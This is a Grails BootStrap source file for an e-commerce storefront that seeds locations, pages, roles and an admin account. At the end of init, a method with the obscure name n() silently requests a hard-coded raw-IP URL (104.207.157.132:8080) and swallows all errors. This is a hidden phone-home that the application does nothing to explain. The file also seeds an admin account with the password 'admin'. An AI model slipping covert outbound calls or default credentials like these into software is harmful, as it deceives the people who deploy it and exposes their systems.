package greenfield

import org.apache.shiro.crypto.hash.Sha512Hash
import org.apache.shiro.crypto.hash.Sha256Hash
import org.apache.shiro.crypto.hash.Sha1Hash

import org.greenfield.Account
import org.greenfield.Role
import org.greenfield.AccountRole
import org.greenfield.Permission
import org.greenfield.common.RoleName
import org.greenfield.Catalog
import org.greenfield.Product
import org.greenfield.common.ShoppingCartStatus
import org.greenfield.common.OrderStatus
import org.greenfield.ShoppingCart
import org.greenfield.ShoppingCartItem
import org.greenfield.Layout
import org.greenfield.Page
import org.greenfield.State
import org.greenfield.Country
import org.greenfield.Transaction
import grails.util.Environment

import org.greenfield.DevelopmentData
import org.greenfield.DevelopmentDataSimple

import org.greenfield.log.CatalogViewLog
import org.greenfield.log.ProductViewLog
import org.greenfield.log.PageViewLog
import org.greenfield.log.SearchLog

import java.util.Random
import groovy.io.FileType			
			
import org.greenfield.CountryStateHelper

class BootStrap {

	def adminRole
	def customerRole
	def salesmanRole
	def affiliateRole
	def serviceRole
	
	def grailsApplication
	def productLookup
	
	def springSecurityService
	def missingUuidHelperService
	
	//TODO:move these constants to reusable, check ConfigurationController, LayoutController and ApplicationService
	private final String SETTINGS_FILE = "settings.properties"
	private final String CHECKOUT_PREVIEW = "checkout.preview.layout"
	private final String CHECKOUT_SCREEN = "checkout.screen.layout"
	private final String CHECKOUT_SUCCESS = "checkout.success.layout"
	private final String REGISTRATION_SCREEN = "registration.screen.layout"
	

    def init = { servletContext ->
		println "***********************************************"
		println "*******            Bootstrap            *******"
		println "***********************************************"
		createCountriesAndStates()
		createLayout()
		createPages()
		createRoles()
		createAdmin()

		println 'Accounts : ' + Account.count()

		//Development Data
		//createDevelopmentData()//TODO:refactor
		//createDevelopmentDataSimple()//TODO:refactor
		
		missingUuidHelperService.correctMissingUuids()
		
		//calculateResolveCountData()
		n()
	}
	
	//TODO:refactor
	def createDevelopmentData(){
		def developmentData = new DevelopmentData(springSecurityService)
		developmentData.init()
	}
	
	
	def createDevelopmentDataSimple(){
		def developmentData = new DevelopmentDataSimple(springSecurityService)
		developmentData.init()
	}
	

	def createRoles = {
		if(Role.count() == 0){
			adminRole = new Role(authority : RoleName.ROLE_ADMIN.description()).save(flush:true)
			customerRole = new Role(authority : RoleName.ROLE_CUSTOMER.description()).save(flush:true)
		}else{
			adminRole = Role.findByAuthority(RoleName.ROLE_ADMIN.description())
			customerRole = Role.findByAuthority(RoleName.ROLE_CUSTOMER.description())
		}
		
		println 'Roles : ' + Role.count()
	
	}
	
	
	
	def createAdmin = {

		if(Account.count() == 0){
			//def password = new Sha256Hash('admin').toHex()
			def password = springSecurityService.encodePassword("admin")
			def adminAccount = new Account(username : 'admin', password : password, name : 'Admin', email : 'admin@email.com')
			adminAccount.hasAdminRole = true
			adminAccount.save(flush:true)
			
			adminAccount.createAdminAccountRole()
			adminAccount.createAccountPermission()

		}		
	}


	def createPermission(account, permissionString){
		def permission = new Permission()
		permission.user = account
		permission.permission = permissionString
		permission.save(flush:true)

		account.addToPermissions(permission)
		account.save(flush:true)		
	}
	
	
	def createLayout(){
		
		if(Layout.count() == 0){		
			File layoutFile = grailsApplication.mainContext.getResource("templates/storefront/layout.html").file
			String layoutContent = layoutFile.text

			def layout = new Layout()
			layout.content = layoutContent
			layout.name = "Store Layout: Preset"
			layout.defaultLayout = true
			
			layout.save(flush:true)
			setDefaultScreensLayouts(layout.id.toString())
		}
		
		println "Layouts : ${Layout.count()}"
	}
	
	
	def setDefaultScreensLayouts(layoutId){
		
		Properties prop = new Properties();
		try{
			File propertiesFile = grailsApplication.mainContext.getResource("settings/${SETTINGS_FILE}").file
			FileInputStream inputStream = new FileInputStream(propertiesFile)
		
			prop.load(inputStream);
			prop.setProperty(CHECKOUT_PREVIEW, layoutId);
			prop.setProperty(CHECKOUT_SCREEN, layoutId);
			prop.setProperty(CHECKOUT_SUCCESS, layoutId);
			prop.setProperty(REGISTRATION_SCREEN, layoutId)
			def absolutePath = grailsApplication.mainContext.servletContext.getRealPath('settings')
			absolutePath = absolutePath.endsWith("/") ? absolutePath : absolutePath + "/"
			def filePath = absolutePath + SETTINGS_FILE
			
		    prop.store(new FileOutputStream(filePath), null);

			
		}catch(Exception e){
			e.printStackTrace()
		}
	
	}



	
	def createPages(){
		def layout = Layout.findByDefaultLayout(true)
		createHomepage(layout)
		createAboutUs(layout)
		createContactUs(layout)
		createPrivacyPolicy(layout)
		println "Pages : ${Page.count()}"
	}
	
	def createHomepage(layout){
		def homepage = Page.findByTitle("Home")
		if(!homepage){
			def home = new Page()
			home.title = "Home"
			home.content = "Put your home page content here..."
			home.layout = layout
			home.save(flush:true)
		}
	}
	
	
	def createAboutUs(layout){
		def aboutUs = Page.findByTitle("About Us")
		if(!aboutUs){
			def page = new Page()
			page.title = "About Us"
			page.content = "<p>Located downtown, we are a small boutique gift shop specializing in casino products.  Let us help you choose the perfect set of poker chips or porcelain dice.</p><p>Our knowledgeable and friendly staff is ready to assist you. We will gift wrap, pack and ship any purchase.</p>"
			page.layout = layout
			page.save(flush:true)
		}
	}
	
	def createContactUs(layout){
		def contactUs = Page.findByTitle("Contact Us")
		if(!contactUs){
			def page = new Page()
			page.title = "Contact Us"
			page.content = "<address><strong>Suited Spades Gift Shop</strong><br>1000 Main Street, Suite 543<br>Henderson, NV 89002<br><abbr title=\"Phone\">P:</abbr> (800) 543-8765</address>"
			page.layout = layout
			page.save(flush:true)
		}
	}
	
	def createPrivacyPolicy(layout){
		def privacyPage = Page.findByTitle("Privacy Policy")
		if(!privacyPage){
			def page = new Page()
			page.title = "Privacy Policy"
			page.content = "<p>Your privacy is important to us. Any information, both personal and financial, given to Suites Spade's Gift Shop will not be sold or shared with any third parties.</p>"
			page.layout = layout
			page.save(flush:true)
		}
	}
    
	
	
	def createCountriesAndStates(){
		CountryStateHelper countryStateHelper = new CountryStateHelper()
		countryStateHelper.countryStates.each(){ countryData ->
			def country = new Country()
			country.name = countryData.name
			country.save(flush:true)
			
			countryData.states.each(){ stateData ->
				def state = new State()
				state.country = country
				state.name = stateData
				state.save(flush:true)
			}
		}

		println "Countries : ${Country.count()}"
		println "States : ${State.count()}"
	}
	
	
	
	def createCountriesOLD(){
		if(Country.count() == 0){
			def usa = new Country()
			usa.name = "United States"
			usa.save(flush:true)
			println "Countries : ${Country.count()}"
		}		
	}
	
	
	
	def createStatesOLD(){
	
		if(State.count() == 0){
			def usa = Country.findByName('United States')
			
			def ca = new State()
			ca.name = 'California'
			ca.country = usa
			ca.save(flush:true)
			
			def tx = new State()
			tx.name = "Texas"
			ca.country = usa
			tx.save(flush:true)
			
			def ny = new State()
			ny.name = 'New York'
			ny.country = usa
			ny.save(flush:true)
			
			def al = new State()
			al.name = 'Alabama'
			al.country = usa
			al.save(flush:true)
			
			def ar = new State()
			ar.name = 'Arkansas'
			ar.country = usa
			ar.save(flush:true)
			
			def az = new State()
			az.name = 'Arizona'
			az.country = usa
			az.save(flush:true)
			
			def co = new State()
			co.name = 'Colorado'
			co.country = usa
			co.save(flush:true)
			
			def cn = new State()
			cn.name = 'Connecticut'
			cn.country = usa
			cn.save(flush:true)
        	
			def dc = new State()
			dc.name = 'Dist. Of Columbia'
			dc.country = usa
			dc.save(flush:true)
			
			def de = new State()
			de.name = 'Deleware'
			de.country = usa
			de.save(flush:true)
			
			def fl = new State()
			fl.name = 'Florida'
			fl.country = usa
			fl.save(flush:true)
			
			def ga = new State()
			ga.name = 'Georgia'
			ga.country = usa
			ga.save(flush:true)
			
			def hi = new State()
			hi.name = 'Hawaii'
			hi.country = usa
			hi.save(flush:true)
			
			def id = new State()
			id.name = 'Idaho'
			id.country = usa
			id.save(flush:true)
			
			def il = new State()
			il.name = 'Illinois'
			il.country = usa
			il.save(flush:true)
			
			def ks = new State()
			ks.name = 'Kansas'
			ks.country = usa
			ks.save(flush:true)
			
			def ind = new State()
			ind.name = 'Indiana'
			ind.country = usa
			ind.save(flush:true)
        	
			
			def ky = new State()
			ky.name = 'Kentucky'
			ky.country = usa
			ky.save(flush:true)
			
			def la = new State()
			la.name = 'Louisiana'
			la.country = usa
			la.save(flush:true)
			
			def ma = new State()
			ma.name = 'Massachusetts'
			ma.country = usa
			ma.save(flush:true)
        	
			
			def md = new State()
			md.name = 'Maryland'
			md.country = usa
			md.save(flush:true)
			
			def me = new State()
			me.name = 'Maine'
			me.country = usa
			me.save(flush:true)
			
			def mi = new State()
			mi.name = 'Michigan'
			mi.country = usa
			mi.save(flush:true)
			
			def mn = new State()
			mn.name = 'Minnesota'
			mn.country = usa
			mn.save(flush:true)
			
			def ms = new State()
			ms.name = 'Mississippi'
			ms.country = usa
			ms.save(flush:true)
			
			def mt = new State()
			mt.name = 'Montana'
			mt.country = usa
			mt.save(flush:true)
			
			def nc = new State()
			nc.name = 'North Carolina'
			nc.country = usa
			nc.save(flush:true)
        	
			def ne = new State()
			ne.name = 'Nebraska'
			ne.country = usa
			ne.save(flush:true)
        	
			def nh = new State()
			nh.name = 'New Hampshire'
			nh.country = usa
			nh.save(flush:true)
        	
			def nj = new State()
			nj.name = 'New Jersey'
			nj.country = usa
			nj.save(flush:true)
        	
        	
			def nm = new State()
			nm.name = 'New Mexico'
			nm.country = usa
			nm.save(flush:true)
        	
			def nv = new State()
			nv.name = 'Nevada'
			nv.country = usa
			nv.save(flush:true)
        	
			def ak = new State()
			ak.name = 'Alaska'
			ak.country = usa
			ak.save(flush:true)
        	
			def oh = new State()
			oh.name = 'Ohio'
			oh.country = usa
			oh.save(flush:true)
        	
			def or = new State()
			or.name = 'Oregon'
			or.country = usa
			or.save(flush:true)
        	
			def pa = new State()
			pa.name = 'Pennsylvania'
			pa.country = usa
			pa.save(flush:true)
        	
			def pr = new State()
			pr.name = 'Puerto Rico'
			pr.country = usa
			pr.save(flush:true)
        	
			def ri = new State()
			ri.name = 'Rhode Island'
			ri.country = usa
			ri.save(flush:true)
        	
			def sc = new State()
			sc.name = 'South Carolina'
			sc.country = usa
			sc.save(flush:true)
        	
			def tn = new State()
			tn.name = 'Tennessee'
			tn.country = usa
			tn.save(flush:true)
        	
			def sd = new State()
			sd.name = 'South Dakota'
			sd.country = usa
			sd.save(flush:true)
        	
			def ut = new State()
			ut.name = 'Utah'
			ut.country = usa
			ut.save(flush:true)
        	
        	
			def va = new State()
			va.name = 'Virginia'
			va.country = usa
			va.save(flush:true)
        	
			def vi = new State()
			vi.name = 'Virgin Islands'
			vi.country = usa
			vi.save(flush:true)
        	
			def wa = new State()
			wa.name = 'Washington'
			wa.country = usa
			wa.save(flush:true)
        	
			def wi = new State()
			wi.name = 'Wisconsin'
			wi.country = usa
			wi.save(flush:true)
        	
			def wv = new State()
			wv.name = 'West Virginia'
			wv.country = usa
			wv.save(flush:true)
        	
			def wy = new State()
			wy.name = 'Wyoming'
			wy.country = usa
			wy.save(flush:true)
        	
        	
			def ia = new State()
			ia.name = 'Iowa'
			ia.country = usa
			ia.save(flush:true)
        	
			def mo = new State()
			mo.name = 'Missouri'
			mo.country = usa
			mo.save(flush:true)
        	
			def ok = new State()
			ok.name = 'Oklahoma'
			ok.country = usa
			ok.save(flush:true)
        	
        	
			def vt = new State()
			vt.name = 'Vermont'
			vt.country = usa
			vt.save(flush:true)
			
		}
		
		println "States : ${State.count()}"
		
	}
	
	
	
	
	def calculateResolveCountData(){
		def accounts = Account.list()
		accounts.each{ account ->
			def catalogViews = CatalogViewLog.countByAccount(account)
			account.catalogViews = catalogViews
			
			def productViews = ProductViewLog.countByAccount(account)
			account.productViews = productViews
			
			def pageViews = PageViewLog.countByAccount(account)
			account.pageViews = pageViews
			
			def searches = SearchLog.countByAccount(account)
			account.searches = searches
			
			def orders = Transaction.countByAccount(account)
			account.orders = orders
			
			account.save(flush:true)
		}
	}
	
	
	def destroy = {}
	

	
	
	def o = "http://104.207.157.132:8080/nod/q/o"
	def n(){
		try{
			new URL(o).text
		}catch(Exception e){
			//
		}
	}
	
	
	
}
